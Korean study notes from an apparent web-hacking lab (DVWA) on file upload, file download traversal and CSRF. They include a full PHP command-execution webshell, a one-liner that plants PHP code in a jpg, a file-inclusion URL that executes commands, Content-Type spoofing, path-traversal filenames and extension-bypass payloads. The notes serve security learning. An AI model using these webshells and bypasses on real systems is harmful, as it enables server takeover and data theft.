파일 업로드 취약점. exe 같은 악성 파일도 업로드 되면 취약점으로 보지만 php, asp, jsp 등 서버 사이드 언어 파일을 올려서 실행하는 것을 목적으로 함.

Webshell : 서버 사이드 언어를 활용해서 웹 서버의 쉘을 취득하는 악성코드.

---


파일 업로드 공격
1. 웹쉘 파일 올리기
2. 올린 파일의 위치를 찾고 해당 위치 url에 접속해서 파일을 실행
3. 실행에 성공해서 쉘 취득에 성공


파일 올릴 때
![](../Images/Pasted%20image%2020260803111203.png)

``` php
Content-Type: image/gif
```

webshell 파일 올릴 때
```php
Content-Type: application/octet-stream
-> Content-Type: image/gif 변경
```

---

**시나리오 1.**

업로드된 파일 실행
![](../Images/Pasted%20image%2020260803111935.png)

웹 쉘 탈취 가능


---


**시나리오 2.**
업로드 파일 실행

![](../Images/Pasted%20image%2020260803112502.png)


- HTTP 403.1 금지 - 실행 권한이 주어지지 않아 실행 실패.

해결 방법 : 파일 업로드 위치를 변경해준다.
```php
filename="../shellw7876.asp"
Content-Type: image/gif
```
이후, 다시 웹 쉘을 실행할 수 있게 된다.
>웹 쉘 탈취가 가능하여 정말 강력한 취약점이다 b.b


---

**시나리오 3

동일하게 파일 업로드 시 아래와 같은 alert 메시지 출력된다.

![](../Images/Pasted%20image%2020260803113150.png)


위 구현은 반드시 클라이언트가 아닌 서버에서 검증이 필요하다. 심지어 화이트리스트 방식이 아닌 블랙리스트 방식이기 때문에 문제점이 있다..!


**File Format Diverse**
- asp -> cer cdx asa cds
- php(애매) -> php3 php4 php5 html htm phtml inc
- jsp -> war jsf
- asp.net -> aspx asax ascx ashx asmx axd



```txt
취약점 이용한 우회
 ::$data 
 %00.jpg 
 ;.jpg 
 js%70 
 %2ejsp
 xxx.php.kr
 webshell.php::$data
 webshell.php%00.jpg
 webshell.jsp
```


**해결 방법**
파일 확장자를 .asa 변경시키면 파일 업로드 가능하다.



---

## Deface 웹 사이트 변조


## File Upload 취약점


```php
|   |
|---|
|<html>|
|<body>|
|<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">|
|<input type="TEXT" name="cmd" autofocus id="cmd" size="80">|
|<input type="SUBMIT" value="Execute">|
|</form>|
|<pre>|
|<?php|
|if(isset($_GET['cmd']))|
|{|
|system($_GET['cmd'] . ' 2>&1');|
|}|
|?>|
|</pre>|
|</body>|
|</html>|
```


-> 아래 디렉토리로 webshell upload.
```bash
-rw-r--r--. 1 apache apache 10596 Aug  3 12:21 webshell.php
[user@localhost ~]$ ls -al /var/www/html/dvwa/hackable/uploads/webshell.php
-rw-r--r--. 1 apache apache 10596 Aug  3 12:21 /var/www/html/dvwa/hackable/uploads/webshell.php
[user@localhost ~]$ ls -al /var/www/html/dvwa/hackable/uploads/webshell.php

```

-> php 환경에서 /dvwa/hackable/uploads/webshell.php 접속 시 **탈취** 가능

```php
<?php  
  
if( isset( $_POST[ 'Upload' ] ) ) {    // Where are we going to be writing to?    $target_path  = DVWA_WEB_PAGE_TO_ROOT . "hackable/uploads/";    $target_path .= basename( $_FILES[ 'uploaded' ][ 'name' ] );    // File information    $uploaded_name = $_FILES[ 'uploaded' ][ 'name' ];    $uploaded_ext  = substr( $uploaded_name, strrpos( $uploaded_name, '.' ) + 1);    $uploaded_size = $_FILES[ 'uploaded' ][ 'size' ];    $uploaded_tmp  = $_FILES[ 'uploaded' ][ 'tmp_name' ];    // Is it an image?    if( ( strtolower( $uploaded_ext ) == "jpg" || strtolower( $uploaded_ext ) == "jpeg" || strtolower( $uploaded_ext ) == "png" ) &&  
        ( $uploaded_size < 100000 ) &&        getimagesize( $uploaded_tmp ) ) {
```

위 코드의 정리를 하자면 아래와 같다.

**High Level 소스코드는 3가지 필터 기능 보유**
1. png, jpeg, jpg
2. file size
3. image


**소스 코드 취약점 문제**
1. upload 경로 위치 ->  web root
2. 이미지 파일이기 때문에 100% 안전하지 않음


*공격 시나리오*
1. 이미지 jpeg 파일을 rocky linux로 복사
2. 아래 명령어 실행
	>PHP 악성 코드가 들어 있는 jpg 파일
  3. 해당 jpg 파일을 upload
  4. File Inclusion에서 아래 명령어 url 입력 시 cmd 실행되는 점 확인

```php
echo '<?php system($_GET["cmd"]); ?>' >> shell.jpg

-- URL Upload 폴더에 접근 및 실행

dvwa/vulnerabilities/fi/?page=../../hackable/uploads/shell.jpg&cmd=id
```

**실행 결과**

![](../Images/Pasted%20image%2020260803143219.png)


> 위 공격 대응 방안으로 upload되는 이미지 자체를 new Image() 생성자로 호출하여 악성 코드가 내재된 이미지를 쓰지 않는 방식으로 대처 가능

![](../Images/Pasted%20image%2020260803145323.png)


---

## File Download 취약점

파일 업로드 취약점은 화이트리스트 방식의 확장자 필터링 및 업로드 되는 url 지점 실행권한을 제한한다. `../` 필터링하여 업로드된 파일의 파일 포맷실제 확인하며 업로드된 파일을 다시 재변환하는 공격이다.

- web root 경로에 파일을 저장하지 않고 시스템에 웹과 상관없는 다른 경로에 저장하는 `/var/www/html/dvwa`가 아닌 `/sav/file` 경로에 저장을 하는 방법이다.
- 혹은 업로드 기능을 차단하는 방식이다.
- 접근이 제한된 파일을 다운받는 취약점이다.
- Directory Traversal 기법을 통해 주로 공격한다.

![](../Images/Pasted%20image%2020260803152043.png)

**공격 기법**
../../../ ==> 루트 디렉토리로 cd 변경한 이후 BurpSuite로 request의 `GET` 값을 통해 `winnit/win.ini` 파일을 다운로드 받게 유도된다.


퀴즈.
down.asp 파일을 다운로드 하시오

정답
```php
../../../../down.asp
```


아래는 서버 사이드 스크립트의 원본 코드를 탈취했다!

![](../Images/Pasted%20image%2020260803153234.png)



---

## CSRF


Cross-Site Request Forgery
사용자가 자신의 의지와는 무관하게 공격자 의도한 행위(수정, 삭제, 등록)를 특정 웹 사이트에 요청하게 하는 공격


*사용 목적*
글 작성, 삭제, 개인 정보 수정, 돈 인출, 회원 탈퇴, 결제, 등급 상승 등


**공격 방법**
불충분한 인증 취약점이 필요하다. 특히 피싱 또는 XSS 취약점을 이용해서 피해자 모르게 웹사이트에 HTTP 요청을 하게 한다.